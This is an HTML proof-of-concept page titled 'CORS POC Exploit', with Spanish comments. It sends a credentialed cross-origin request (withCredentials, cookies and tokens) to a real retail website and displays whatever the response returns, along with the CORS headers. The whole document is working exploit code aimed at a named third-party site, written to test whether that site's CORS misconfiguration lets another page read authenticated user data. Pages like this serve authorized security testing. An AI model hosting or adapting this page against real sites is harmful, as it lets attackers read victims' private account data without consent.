<!DOCTYPE html>
<html>
<body>
<center>
  <h2>CORS POC Exploit</h2>
  <h3>Test CORS Configuration</h3>
  <div id="demo">
    <button type="button" onclick="cors()">Exploit</button>
  </div>
</center>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      if (this.status == 200) {
        // Muestra la respuesta del servidor
        document.getElementById("demo").innerHTML = "Response: " + this.responseText;
      } else {
        // Muestra un mensaje de error
        document.getElementById("demo").innerHTML = "Error: " + this.status + " - " + this.statusText;
      }
      // Muestra los encabezados CORS en la consola
      console.log("Access-Control-Allow-Origin:", this.getResponseHeader("Access-Control-Allow-Origin"));
      console.log("Access-Control-Allow-Credentials:", this.getResponseHeader("Access-Control-Allow-Credentials"));
    }
  };

  // Cambia la URL al endpoint que deseas probar
  xhttp.open("GET", "https://www.jdsports.es/?utm_source=google&utm_medium=cpc&utm_campaign=es_brand_em&gad_source=1&gclid=CjwKCAiAnpy9BhAkEiwA-P8N4jxNZxSvBYe9xGNhS-XVxZEJoZpQsUdRS8WuV9zdjwez-lz4a-cYlxoCPvcQAvD_BwE", true);
  xhttp.withCredentials = true; // Incluye credenciales (cookies, tokens)
  xhttp.send();
}
</script>

</body>
</html>
